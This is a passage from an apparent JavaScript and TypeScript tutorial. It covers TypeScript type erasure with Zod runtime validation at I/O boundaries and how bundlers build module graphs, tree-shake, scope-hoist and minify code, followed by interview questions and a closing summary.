  // Later, user.age.toFixed() throws at runtime: it's undefined.
}

// ✅ FIX: validate at the I/O boundary with a runtime schema (Zod).
import { z } from 'zod';

const UserSchema = z.object({
  name: z.string(),
  age: z.number(),
});
type User2 = z.infer<typeof UserSchema>;  // type DERIVED from the schema

async function loadUserGood(): Promise<User2> {
  const res = await fetch('/api/user');
  // .parse() runs REAL code at runtime. Wrong shape -> it THROWS here,
  // at the edge, with a clear error — instead of a mystery crash later.
  return UserSchema.parse(await res.json());
}
```

> **Note (simplification):** a few TypeScript constructs (notably `enum` and old-style `namespace`s) *do* emit some runtime JavaScript, so erasure isn't 100% literal for every feature. But plain type annotations, `interface`, and `type` aliases are fully erased — they never produce a single byte of runtime code.

#### 🎤 Interview question
**Q: Why can't TypeScript types be trusted at runtime?**
A: Because they're **erased**. `tsc` checks types at compile time and then strips them out, emitting plain JavaScript with no type information left. So nothing enforces those types while the program runs. Data crossing an I/O boundary — network, file, form, `localStorage` — can be any shape, and TypeScript can't catch it. You must add explicit **runtime validation** (e.g. Zod) at those boundaries.

**Q: What is structural typing?**
A: TypeScript decides compatibility by **shape**, not by name or declared class. If an object has all the properties a type requires (with matching types), it's accepted as that type — even if it was never explicitly declared to be one. It's "if it has the duck's properties, it's a duck."

---

### 📦 Bundlers — Folding Hundreds of Files Into One Tight Package

#### 🧩 What is it?
A **bundler** (Webpack, Rollup, esbuild; Vite orchestrates esbuild in dev and Rollup for production builds) is a tool that takes your many source files — and all the libraries they `import` — and combines them into a small number of optimized output files the browser can load efficiently. Along the way it does four key jobs: builds the **module graph**, applies **scope hoisting**, does **tree-shaking**, and runs **minification**.

#### 🤔 Why do we need it? (the problem)
A real app is hundreds of small files plus dozens of `node_modules` libraries. If the browser had to fetch each file with its own network request, loading would be painfully slow — each request has overhead, and the browser can only do so many at once. Bundlers solve this by **stitching files together ahead of time** and **throwing away everything unused**, so the user downloads far fewer, far smaller files.

#### ⚙️ How does it work?
1. **Module graph.** Starting from an **entry point** (e.g. `index.js`), the bundler reads its `import`s, then *their* imports, and so on — building a graph (a map) of every file your app actually reaches.
2. **Tree-shaking.** Walking that graph, it marks which **exports are actually used** and discards the rest. (It relies on ES Modules being *statically* analyzable — see Module 11 — which is why ESM is "tree-shakeable" and old CommonJS often isn't.)
3. **Scope hoisting.** Instead of wrapping every module in its own function (which adds overhead), it **concatenates** modules into a shared scope where safe, so the engine has fewer wrappers to execute.
4. **Minification.** It shrinks the text: rename `calculateUserTotal` to `a`, strip whitespace and comments, collapse code — same behavior, fewer bytes.

```
   ENTRY: index.js
      │ import
      ├─▶ utils.js ──▶ math.js   (used)
      └─▶ ui.js                   (used)
              │
        bigLib.js exports { used, unused }
              │  tree-shake: keep `used`, DROP `unused`
              ▼
      ┌──────────────────────────┐
      │  scope-hoist + minify     │
      └───────────┬──────────────┘
                  ▼
            bundle.js   (one small file:
            only reached code, renamed + squeezed)
```

#### 🌍 Real-life analogy
Picture **packing for a long trip** instead of carrying loose items in your arms. First you decide what you'll actually use on the trip — and leave the snow boots at home if you're going to the beach (**tree-shaking** unused code). Then you **vacuum-pack** the clothes to squeeze the air out (**minification**). Finally you fit everything into **one tight suitcase** instead of fifty separate bags (**bundling** the module graph). You carry far less, and you get through the airport (the network) much faster.

#### 💻 Code example
```javascript
// ── lib.js: a library exporting TWO things ──
export function used() { return 'I am shipped'; }
export function unused() { return 'I get dropped'; }  // never imported

// ── index.js: the entry point imports only ONE ──
import { used } from './lib.js';
console.log(used());

// ── After bundling + tree-shaking + minify, conceptually: ──
// `unused` is GONE (nothing imported it), names are squeezed:
function u(){return"I am shipped"}console.log(u());
//
// Tree-shaking worked because ES Module imports are STATIC:
// the bundler can see at build time exactly which exports are
// reached, without running the code. A dynamic `require(name)`
// with a computed name can't be analyzed this way -> harder to shake.
```

#### 🎤 Interview question
**Q: What is tree-shaking and what makes code tree-shakeable?**
A: Tree-shaking is dead-code elimination across the module graph: the bundler keeps only the exports your app actually imports and drops the rest. It works when imports are **statically analyzable** — which is why **ES Modules** (fixed, top-level `import`/`export`) shake well, while dynamic CommonJS `require()` with computed paths often can't be safely pruned.

**Q: Name the bundler's main jobs.**
A: Build the **module graph** from an entry point's imports; **tree-shake** unused exports out of that graph; **scope-hoist** modules into shared scopes to cut per-module wrapper overhead; and **minify** the result (rename identifiers, strip whitespace/comments) to ship the fewest bytes with identical behavior.

---

## Conclusion

You've travelled from *"who even decides what JavaScript does?"* all the way to *"how do I stop an attacker from poisoning every object in my app?"* Along the way you've seen how the engine turns your text into machine code, how memory is handed out and quietly reclaimed, how scope, `this`, and prototypes actually work, how the event loop schedules every async line, and how to reason about performance, modules, errors, and security like an architect.

The point was never to memorise trivia — it's to be able to **explain the trade-off behind any decision from first principles**. That is exactly what separates someone who *uses* JavaScript from someone who can *architect* with it.

> **How to lock it in:** revisit each module's 🎤 interview questions and answer them **out loud** before reading the answer. If you can teach it, you own it.
